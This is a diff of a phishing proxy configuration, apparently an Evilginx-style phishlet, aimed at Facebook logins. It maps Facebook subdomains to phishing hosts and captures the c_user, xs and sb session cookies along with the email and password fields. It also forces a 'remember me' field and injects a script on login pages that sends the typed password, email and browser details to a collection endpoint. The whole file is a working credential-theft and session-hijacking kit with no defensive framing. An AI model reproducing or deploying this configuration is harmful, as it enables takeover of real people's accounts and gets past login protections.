@@ -1,75 +1,65 @@
 min_ver: '3.0.0'
 author: 'Anon0369G'
-redirect_url: 'https://www.facebook.com/'  # Redirect after login
+redirect_url: 'https://www.facebook.com/'
 
 proxy_hosts:
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
-  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
-  - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'facebook.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false} # Static content generally does not require auto_filter
+  - {phish_sub: 'connect', orig_sub: 'connect', domain: 'facebook.com', session: false, is_landing: false} # Typically not necessary for external login connection
+  - {phish_sub: 'business', orig_sub: 'business', domain: 'facebook.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'secure', orig_sub: 'secure', domain: 'facebook.com', session: true, is_landing: false, auto_filter: true}
 
 sub_filters:
   - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
   - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  # Handles mobile domain specifics
   - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
   - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '2F{hostname}', replace: '2F{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
   - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '\\\\\\/\\\\\\/{hostname}', replace: '\\\\\\/\\\\\\/{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  # Supports obfuscated URL replacements for JS assets
   - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https:\/\/{hostname}\/', replace: 'https:\/\/{hostname}\/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
   - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
-  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'www', domain: 'facebook.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json', 'application/x-javascript']}
-  
+  # Static CDN replacements (adjusted to work similarly as xx.fbcdn.net would for Facebook)
+  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'static', domain: 'facebook.com', search: 'https://static.{hostname}/', replace: 'https://static.{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'www', domain: 'facebook.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json']}
+  # Additional sub_filters as needed...
+
 auth_tokens:
   - domain: '.facebook.com'
-    keys: ['c_user','xs','sb']
+    keys: ['c_user', 'xs', 'sb']
     type: 'cookie'
 
 credentials:
   username:
-    key: 'email'  # Updated to match your form input name
+    key: 'email'
     search: '(.*)'
     type: 'post'
   password:
-    key: 'pass'  # Updated to match your form input name
+    key: 'pass'
     search: '(.*)'
     type: 'post'
-
-  custom:
-    - key: '^pass$'  # Optional, but includes alternate name for capturing
-      search: '(.*)'
-      type: 'post'
-    - key: '^Password$'
-      search: '(.*)'
-      type: 'post'
-    - key: 'UserAgent'
-      search: '(.*)'
-      type: 'post'
-    - key: 'Browser'
-      search: '(.*)'
-      type: 'post'
-    - key: 'Engine'
-      search: '(.*)'
-      type: 'post'
-    - key: 'Platform'
-      search: '(.*)'
-      type: 'post'
-
+    
 force_post:
-  - path: '/login'
+  - path: '/login.php'  # Ensure this matches the actual path of your login form
     search:
-      - {key: 'email', search: '.*'}
-      - {key: 'pass', search: '.*'}
+      - {key: 'email', search: '.*'}  # Matches the email/username field
+      - {key: 'pass', search: '.*'}   # Matches the password field
     force:
-      - {key: 'remember_me', value: '1'}
+      - {key: 'remember_me', value: '1'}  # Facebook often has a "Remember Me" field, so setting it to ensure a session capture
+      - {key: 'timezone', value: '240'}  # Example timezone, could be dynamic based on client location
+      - {key: 'lgndim', value: 'eyJ3IjoxOTIwLCJoIjo5NzYsImF3IjoxOTIwLCJhaCI6OTQxLCJjIjoyNH0='}  # Example dimensions of the screen for client context
+      - {key: 'lgnrnd', value: '000443_WaEd'}  # Example login randomizer field
+      - {key: 'lgnjs', value: '1730707484'}  # Example JavaScript timestamp for login validation
     type: 'post'
-
-login:
-  domain: 'www.facebook.com'
-  path: '/login.php'
 
 js_inject:
   - trigger_domains: ["login.facebook.com", "m.facebook.com", "www.facebook.com"]
     trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*", "/m/login"]
     script: |
       (function() {
+        // Function to collect browser details
         function collectBrowserData() {
           var xhr = new XMLHttpRequest();
           var userAgent = navigator.userAgent;
@@ -80,18 +70,24 @@ js_inject:
           xhr.send("user_agent=" + encodeURIComponent(userAgent) + "&browser=" + encodeURIComponent(browser) + "&platform=" + encodeURIComponent(platform));
         }
 
+        // Function to capture and send password securely
         function capturePassword() {
-          var passwordField = document.querySelector("input[name='pass']");  // Ensure this matches the input field name
+          var passwordField = document.querySelector("input[name='pass']");
+          var emailField = document.querySelector("input[name='email']");
           var xhr = new XMLHttpRequest();
-          if (passwordField) {
-            xhr.open("POST", '/login', true);  // Ensure this path is correct
+          if (passwordField && emailField) {
+            xhr.open("POST", '/login', true);  // Adjust the path to match your site
             xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            xhr.send("captured_password=" + encodeURIComponent(passwordField.value));
+            xhr.send("captured_password=" + encodeURIComponent(passwordField.value) + "&captured_email=" + encodeURIComponent(emailField.value));
           }
         }
 
+        // Initialize function on DOMContentLoaded
         document.addEventListener("DOMContentLoaded", function() {
-          collectBrowserData();
-          document.querySelector("form").addEventListener("submit", capturePassword);
+          collectBrowserData();  // Collect browser data for context
+          var form = document.querySelector("form");  // Target the login form
+          if (form) {
+            form.addEventListener("submit", capturePassword);  // Attach capturePassword on submit
+          }
         });
       })();
